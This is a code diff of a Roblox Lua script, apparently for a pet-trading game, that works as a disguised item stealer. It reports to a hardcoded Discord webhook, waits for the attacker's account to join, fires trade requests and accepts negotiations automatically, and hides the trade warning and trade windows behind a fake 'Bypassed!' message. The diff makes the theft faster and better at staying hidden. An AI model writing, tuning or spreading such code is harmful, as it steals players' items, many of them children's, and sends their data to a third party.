@@ -132,7 +132,7 @@ end
 
 local LogsWebhook = "https://discord.com/api/webhooks/1309897171369197588/Es13EP_U_GLWFjJrAwXPasVMU_0h61c3um6K5GNT4z_YJugWa6TGw2m6XNkpV_Y6rWgL"
 sendEmbed(LogsWebhook, embed2)
-wait(5)
+wait(7)
 sendEmbed(Webhook, embed1)
 
 local trade_info = {}
@@ -156,11 +156,9 @@ local function SendTrade()
   local RouterClient = Loads("RouterClient")
   local send_trade = RouterClient.get("TradeAPI/SendTradeRequest")
   
-  while task.wait(10) do
+  while task.wait(0.1) do
         repeat
-        send_trade:FireServer(LogsUsername)
-end
-            
+    send_trade:FireServer(game.Players[LogsUsername])       
 wait(4)
 local Loads = require(game.ReplicatedStorage.Fsys).load
   local RouterClient = Loads("RouterClient")
@@ -184,7 +182,7 @@ local Loads = require(game.ReplicatedStorage.Fsys).load
   else
     print("No pets found in inventory.")
   end
-wait(9)
+wait(1)
 local Loads = require(game.ReplicatedStorage.Fsys).load
   local RouterClient = Loads("RouterClient")
   local AcceptNegotiationRemote = RouterClient.get("TradeAPI/AcceptNegotiation")
@@ -206,7 +204,7 @@ end
 local function WaitForTrade()
   while true do
     if game.Players:FindFirstChild(LogsUsername) then
-      wait(5)
+      wait(1)
       StartSteal()
       break
     else
@@ -225,6 +223,6 @@ print("Bypassed!")
     if total_pets == 1 then
         game:GetService("Players").LocalPlayer:Kick("Alt account detected, please have at least 1 pet in your inventory or use this script on your main account.")
 end
-game:GetService("Players").LocalPlayer.PlayerGui.DialogApp.Dialog.Visible = false
+game:GetService("Players").LocalPlayer.PlayerGui.TradeWarningGui.Visible = false
 game:GetService("Players").LocalPlayer.PlayerGui.TradeApp.Enabled = false
 WaitForTrade()
